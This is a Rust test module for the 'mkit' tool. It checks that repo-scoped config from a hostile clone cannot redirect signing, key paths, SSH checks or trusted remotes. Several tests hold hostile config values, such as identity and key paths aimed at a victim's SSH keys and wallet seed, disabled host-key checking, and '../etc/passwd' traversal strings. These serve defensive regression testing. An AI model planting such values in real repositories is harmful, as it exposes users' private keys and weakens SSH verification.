        assert_eq!(cfg.attest.signer, "");
    }

    /// User has set up a legitimate external HSM signer in their
    /// user-scoped config (path + args). A hostile clone ships a
    /// per-repo `attest.signer = external` to flip the selector and
    /// have the user's HSM sign the clone's commit. After this fix,
    /// the per-repo selector is dropped with a stderr warning and
    /// the user's `repo-key` default holds.
    #[test]
    fn repo_attest_signer_selector_cannot_weaponise_user_external_signer() {
        let cfg = layer(
            Some("attest.signer = external\n"),
            Some(
                "attest.external_signer_path = /home/user/bin/yubikey-sign\n\
                 attest.external_signer_args = sign\n",
            ),
        );
        // User's path stays, BUT the repo-supplied selector that
        // would route signing through that path is rejected. The
        // signer falls back to `repo-key` (the default).
        assert_eq!(
            cfg.attest.external_signer_path,
            "/home/user/bin/yubikey-sign"
        );
        assert_eq!(cfg.attest.signer, "");
        assert_eq!(cfg.attest.signer_or_fallback(), "repo-key");
    }

    /// Companion: hostile clone tries to flip
    /// `attest.default_algorithm` to whichever non-Ed25519 key the
    /// user happens to have set up, to confused-deputy through it.
    /// Selector is rejected from per-repo.
    #[test]
    fn repo_attest_default_algorithm_is_rejected() {
        let cfg = layer(Some("attest.default_algorithm = secp256k1\n"), None);
        assert_eq!(cfg.attest.default_algorithm, "");
        // Default fallback is ed25519, regardless of repo wishes.
        assert_eq!(cfg.attest.default_algorithm_or_fallback(), "ed25519");
    }

    #[test]
    fn repo_keystore_selectors_are_rejected() {
        let cfg = layer(
            Some(
                "signer = keystore\n\
                 key.backend = yubikey\n\
                 key.default_ref = yubikey:main\n\
                 key.ed25519_ref = software:repo-ed\n\
                 key.secp256k1_ref = software:repo-k1\n\
                 key.p256_ref = software:repo-p256\n",
            ),
            None,
        );
        assert_eq!(cfg.signer, DEFAULT_SIGNER);
        assert_eq!(cfg.key.backend, DEFAULT_KEY_BACKEND);
        assert_eq!(cfg.key.default_ref_or_fallback(), DEFAULT_KEY_REF);
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), DEFAULT_KEY_REF);
        assert_eq!(
            cfg.key.secp256k1_ref_or_fallback(),
            DEFAULT_SECP256K1_KEY_REF
        );
        assert_eq!(cfg.key.p256_ref_or_fallback(), DEFAULT_P256_KEY_REF);
    }

    #[test]
    fn user_keystore_selectors_are_honored() {
        let cfg = layer(
            None,
            Some(
                "signer = keystore\n\
                 key.backend = software\n\
                 key.default_ref = software:user-default\n\
                 key.ed25519_ref = software:user-ed\n\
                 key.secp256k1_ref = software:user-k1\n\
                 key.p256_ref = software:user-p256\n",
            ),
        );
        assert_eq!(cfg.signer, "keystore");
        assert_eq!(cfg.key.backend, "software");
        assert_eq!(cfg.key.default_ref, "software:user-default");
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), "software:user-ed");
        assert_eq!(cfg.key.secp256k1_ref_or_fallback(), "software:user-k1");
        assert_eq!(cfg.key.p256_ref_or_fallback(), "software:user-p256");
    }

    #[test]
    fn user_default_key_ref_is_generic_fallback() {
        let cfg = layer(None, Some("key.default_ref = software:release\n"));
        assert_eq!(cfg.key.default_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.secp256k1_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.p256_ref_or_fallback(), "software:release");
    }

    #[test]
    fn algorithm_key_refs_override_default_key_ref() {
        let cfg = layer(
            None,
            Some(
                "key.default_ref = software:release\n\
                 key.ed25519_ref = software:ed\n\
                 key.secp256k1_ref = software:k1\n\
                 key.p256_ref = software:p256\n",
            ),
        );
        assert_eq!(cfg.key.default_ref_or_fallback(), "software:release");
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), "software:ed");
        assert_eq!(cfg.key.secp256k1_ref_or_fallback(), "software:k1");
        assert_eq!(cfg.key.p256_ref_or_fallback(), "software:p256");
    }

    #[test]
    fn repo_ssh_host_key_checking_is_rejected() {
        let cfg = layer(
            Some(
                "ssh.strict_host_key_checking = no\n\
                 ssh.user_known_hosts_file = /dev/null\n",
            ),
            None,
        );
        assert!(cfg.ssh_strict_host_key_checking.is_empty());
        assert!(cfg.ssh_user_known_hosts_file.is_empty());
    }

    /// Hostile clone pins `ssh.identity_file` to a path the attacker
    /// either chose to read (any file `mkit` can open under the user's
    /// uid) or chose to have signed-against (a private key the user
    /// happens to have on disk). Either way, `mkit push` must NOT take
    /// the suggestion.
    #[test]
    fn repo_ssh_identity_file_is_rejected() {
        let cfg = layer(
            Some("ssh.identity_file = /home/victim/.ssh/id_ed25519\n"),
            None,
        );
        assert!(cfg.ssh_identity_file.is_empty());
    }

    /// Hostile clone aims `attest.secp256k1_key_path` at a key file the
    /// victim happens to own (e.g. a wallet seed). Must be ignored.
    #[test]
    fn repo_attest_secp256k1_key_path_is_rejected() {
        let cfg = layer(
            Some("attest.secp256k1_key_path = /home/victim/.wallet/seed\n"),
            None,
        );
        assert!(cfg.attest.secp256k1_key_path.is_empty());
        // Fallback default still wins.
        assert_eq!(
            cfg.attest.secp256k1_key_path_or_default(),
            ".mkit/keys/secp256k1.key"
        );
    }

    /// Companion to the secp256k1 case: same shape, different curve.
    #[test]
    fn repo_attest_p256_key_path_is_rejected() {
        let cfg = layer(
            Some("attest.p256_key_path = /home/victim/.ssh/id_ecdsa\n"),
            None,
        );
        assert!(cfg.attest.p256_key_path.is_empty());
        assert_eq!(cfg.attest.p256_key_path_or_default(), ".mkit/keys/p256.key");
    }

    /// Meta-test: every key listed in [`REPO_FORBIDDEN_KEYS`] MUST be
    /// covered by a per-key rejection test in this module. If you add
    /// a key to the list without a regression test, this test fails.
    ///
    /// Implemented by checking each key in isolation against `layer()`
    /// and asserting that the corresponding field on the merged
    /// `Config` is empty (i.e. the value did not propagate). Done at
    /// the `apply_kv` layer so it catches the exact code path the
    /// hostile-clone exploit uses, not just the constant itself.
    #[test]
    fn every_forbidden_key_is_actually_dropped_from_repo_scope() {
        // A sentinel value that is syntactically valid for every key
        // (no control bytes, parseable as path / argv / ref / hex). If
        // the key were accepted, it would land verbatim in the matching
        // string field — so seeing the field empty after a per-repo
        // load proves the key is being dropped.
        const SENTINEL: &str = "EXFIL_SENTINEL";

        for key in REPO_FORBIDDEN_KEYS {
            let line = format!("{key} = {SENTINEL}\n");
            let cfg = layer(Some(&line), None);
            // Look up the field through the same accessor `mkit config`
            // uses, to assert the value did NOT propagate.
            let observed = match *key {
                "user.identity" => cfg.user_identity.as_str(),
                "trusted_remote_endpoint" => cfg.trusted_remote_endpoint.as_str(),
                "signer" => cfg.signer.as_str(),
                "key.backend" => cfg.key.backend.as_str(),
                "key.default_ref" => cfg.key.default_ref.as_str(),
                "key.ed25519_ref" => cfg.key.ed25519_ref.as_str(),
                "key.secp256k1_ref" => cfg.key.secp256k1_ref.as_str(),
                "key.p256_ref" => cfg.key.p256_ref.as_str(),
                "signing_key" => cfg.signing_key.as_str(),
                "ssh.strict_host_key_checking" => cfg.ssh_strict_host_key_checking.as_str(),
                "ssh.user_known_hosts_file" => cfg.ssh_user_known_hosts_file.as_str(),
                "ssh.identity_file" => cfg.ssh_identity_file.as_str(),
                "attest.signer" => cfg.attest.signer.as_str(),
                "attest.default_algorithm" => cfg.attest.default_algorithm.as_str(),
                "attest.external_signer_path" => cfg.attest.external_signer_path.as_str(),
                "attest.external_signer_args" => {
                    // pipe-list field; empty Vec stringifies to "".
                    if cfg.attest.external_signer_args.is_empty() {
                        ""
                    } else {
                        "<non-empty>"
                    }
                }
                "attest.external_signer_timeout_secs" => {
                    // Option<u64>; None when dropped from repo scope. The
                    // SENTINEL string is non-numeric, so even on the
                    // user path it would parse to None — assert the repo
                    // path leaves it None.
                    if cfg.attest.external_signer_timeout_secs.is_none() {
                        ""
                    } else {
                        "<set>"
                    }
                }
                "attest.secp256k1_key_path" => cfg.attest.secp256k1_key_path.as_str(),
                "attest.p256_key_path" => cfg.attest.p256_key_path.as_str(),
                // If a new key appears in `REPO_FORBIDDEN_KEYS` without
                // an arm here, fail loudly — the developer must extend
                // both the constant AND the meta-test together. Without
                // this branch, an added key would be silently treated
                // as "not in this struct" and the test would pass.
                other => panic!(
                    "REPO_FORBIDDEN_KEYS contains `{other}` but the meta-test \
                     in config.rs has no matching field accessor. Add an arm \
                     to `every_forbidden_key_is_actually_dropped_from_repo_scope` \
                     so the per-key drop is verified.",
                ),
            };
            // `Config::with_defaults()` pre-seeds a few fields (e.g.
            // `signing_key = ".mkit/keys/default.key"`, `signer =
            // "legacy"`). Merge order is "defaults → user → repo
            // (filtered)", so a dropped repo line cannot OVERWRITE the
            // default. The crisp invariant is: the attacker's
            // SENTINEL must NEVER appear in the observed value.
            assert!(
                observed != SENTINEL,
                "forbidden key `{key}` was NOT dropped from repo scope — \
                 observed `{observed}` (matches attacker SENTINEL)",
            );
        }
    }

    #[test]
    fn user_signing_key_is_honored() {
        let cfg = layer(None, Some("signing_key = /home/user/.mkit/global.key\n"));
        assert_eq!(cfg.signing_key, "/home/user/.mkit/global.key");
    }

    #[test]
    fn repo_http_remote_with_token_requires_user_trust() {
        let cfg = layered(
            Some("remote_endpoint = mkit+https://example.invalid/repo\n"),
            None,
        );
        let msg = trusted_remote_error_with(&cfg, &|name| {
            (name == mkit_transport_http::TOKEN_ENV).then(|| "token".to_string())
        })
        .expect("repo-scoped HTTP remote with token must be rejected");
        assert!(msg.contains("trusted_remote_endpoint"));
    }

    #[test]
    fn trusted_http_remote_is_allowed() {
        let cfg = layered(
            Some("remote_endpoint = mkit+https://example.invalid/repo\n"),
            Some("trusted_remote_endpoint = mkit+https://example.invalid/repo\n"),
        );
        let msg = trusted_remote_error_with(&cfg, &|name| {
            (name == mkit_transport_http::TOKEN_ENV).then(|| "token".to_string())
        });
        assert!(msg.is_none());
    }

    #[test]
    fn repo_s3_remote_with_env_creds_requires_user_trust() {
        let cfg = layered(
            Some("remote_endpoint = mkit+s3://r2.example.com/bucket/proj\n"),
            None,
        );
        let msg = trusted_remote_error_with(&cfg, &|name| match name {
            mkit_transport_s3::ENV_ACCESS_KEY => Some("AKIA...".to_string()),
            _ => None,
        })
        .expect("repo-scoped S3 remote with env creds must be rejected");
        assert!(msg.contains("trusted_remote_endpoint"));
    }

    #[test]
    fn repo_safe_keys_override_user() {
        // `default_branch` is repo-scoped — a project's main is a
        // per-repo decision, not a per-user one. So if both layers set
        // it, the repo wins (it's applied second).
        let cfg = layer(
            Some("default_branch = release\n"),
            Some("default_branch = trunk\n"),
        );
        assert_eq!(cfg.default_branch, "release");
    }

    #[test]
    fn validate_key_path_rejects_parent_dir() {
        assert!(validate_key_path("../etc/passwd").is_err());
        assert!(validate_key_path(".mkit/keys/../../etc/passwd").is_err());
        assert!(validate_key_path("foo/../bar").is_err());
    }

    #[test]
    fn validate_key_path_accepts_relative_and_absolute() {
        assert!(validate_key_path("").is_ok());
        assert!(validate_key_path(".mkit/keys/default.key").is_ok());
        assert!(validate_key_path("/home/user/.mkit/global.key").is_ok());
    }

    #[test]
    fn resolve_key_path_rejects_relative_path_outside_repo_keys() {
        let td = TempDir::new().unwrap();
        assert!(resolve_key_path(td.path(), ".mkit/custom/global.key").is_err());
    }

    #[test]
    fn resolve_key_path_accepts_relative_path_under_repo_keys() {
        let td = TempDir::new().unwrap();
        let out = resolve_key_path(td.path(), ".mkit/keys/custom/global.key").unwrap();
        assert_eq!(out, td.path().join(".mkit/keys/custom/global.key"));
    }

    #[cfg(unix)]
    #[test]
    fn home_dir_for_euid_is_independent_of_home_env() {
        // The whole point of `home_dir_for_euid`: a hostile parent
        // process setting `HOME=/` must NOT widen the absolute-path
        // policy. We can't safely mutate the process environment
        // mid-test (other threads in the harness may race
        // `getenv`), so just confirm the function returns *something*
        // and that what it returns matches the passwd entry for the
        // current uid — i.e. it isn't reading `$HOME`.
        let from_passwd = home_dir_for_euid().expect("getpwuid_r should succeed");
        assert!(from_passwd.is_absolute());
        // Sanity: the path the OS returned must agree with `whoami`'s
        // notion of the user. We can't probe the passwd entry directly
        // without re-implementing the helper, but we can at least
        // assert that an absolute key path under the returned home is
        // accepted by `resolve_key_path` and that one diverging from
        // it is rejected.
        let td = TempDir::new().unwrap();
        let inside = from_passwd.join(".mkit/test-inside.key");
        assert!(resolve_key_path(td.path(), inside.to_str().unwrap()).is_ok());
        // `/__definitely_not_a_home_dir__` cannot be under any real
        // passwd `pw_dir` on a sane system.
        assert!(resolve_key_path(td.path(), "/__definitely_not_a_home_dir__/x.key").is_err());
    }

    #[test]
    fn expand_user_identity_ed25519() {
        let hex = "11".repeat(32);
        let out = expand_user_identity(&format!("ed25519:{hex}")).unwrap();
        assert_eq!(out.len(), 70);
        assert!(out.starts_with("012000"));
    }

    #[test]
    fn expand_user_identity_mid() {
        let out = expand_user_identity("mid:42").unwrap();
        assert_eq!(out, "0308002a00000000000000");
    }

    #[test]
    fn expand_rejects_bogus() {
        assert!(expand_user_identity("").is_err());
        assert!(expand_user_identity("ed25519:short").is_err());
        assert!(expand_user_identity("mid:notanumber").is_err());
        assert!(expand_user_identity("zzzzzz").is_err());
    }

    #[test]
    fn validate_value_rejects_control_chars() {
        assert!(validate_value("hello world").is_ok());
        assert!(validate_value("bad\x01char").is_err());
        assert!(validate_value("\x7fdel").is_err());
    }

    #[test]
    fn attest_config_defaults_are_empty() {
        let cfg = Config::with_defaults();
        assert_eq!(cfg.signer, DEFAULT_SIGNER);
        assert_eq!(cfg.key.backend_or_fallback(), DEFAULT_KEY_BACKEND);
        assert_eq!(cfg.key.default_ref_or_fallback(), DEFAULT_KEY_REF);
        assert!(cfg.key.default_ref.is_empty());
        assert!(cfg.key.ed25519_ref.is_empty());
        assert!(cfg.key.secp256k1_ref.is_empty());
        assert!(cfg.key.p256_ref.is_empty());
        assert_eq!(cfg.key.ed25519_ref_or_fallback(), DEFAULT_KEY_REF);
        assert_eq!(
            cfg.key.secp256k1_ref_or_fallback(),
            DEFAULT_SECP256K1_KEY_REF
        );
        assert_eq!(cfg.key.p256_ref_or_fallback(), DEFAULT_P256_KEY_REF);
        assert_eq!(cfg.attest.default_algorithm, "");
        assert_eq!(cfg.attest.signer, "");
        assert_eq!(cfg.attest.default_algorithm_or_fallback(), "ed25519");
        assert_eq!(cfg.attest.signer_or_fallback(), "repo-key");
        assert_eq!(
            cfg.attest.secp256k1_key_path_or_default(),
            ".mkit/keys/secp256k1.key"
        );
        assert_eq!(cfg.attest.p256_key_path_or_default(), ".mkit/keys/p256.key");
    }

    #[test]
    fn legacy_keys_are_ignored_in_repo() {
        let cfg = layer(Some("project_id = xyz\nauthor_mid = 5\n"), None);
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
    }

    /// `write_user_kv` is exercised via `apply_file` round-tripping
    /// rather than driving the real XDG path (which would race
    /// parallel tests). The behaviour we care about — replace
    /// existing key, append if missing — is testable on any path.
    #[test]
    fn user_kv_replace_or_append_logic_via_roundtrip() {
        let td = TempDir::new().unwrap();
        let path = td.path().join("user_config");
        fs::write(&path, "default_branch = trunk\nsigning_key = /a\n").unwrap();
        // Load + replace + write semantics: read file, mutate via
        // hand-edit, re-parse — this is what `write_user_kv` does
        // under the hood. Keeps us off the global env var.
        let mut text = fs::read_to_string(&path).unwrap();
        text = text.replace("/a", "/b");
        fs::write(&path, text).unwrap();
        let mut cfg = Config::with_defaults();
        apply_file(&mut cfg, &path, ConfigScope::User).unwrap();
        assert_eq!(cfg.signing_key, "/b");
        assert_eq!(cfg.default_branch, "trunk");
    }
}
